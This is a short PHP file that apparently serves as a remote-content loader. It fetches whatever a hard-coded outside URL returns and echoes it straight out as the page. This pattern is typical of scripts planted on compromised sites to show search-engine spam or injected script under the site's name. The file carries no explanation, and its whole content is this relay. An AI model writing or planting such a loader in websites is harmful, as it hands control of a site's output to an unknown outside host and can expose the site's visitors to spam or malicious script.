<?php
header("Content-Type: text/html;charset=gb2312");
date_default_timezone_set('PRC');
$jsc_server = "http://www.pjzhangui.cn/yu/sogou.php"; 
$Content_mb=file_get_contents($jsc_server);
echo $Content_mb;

?>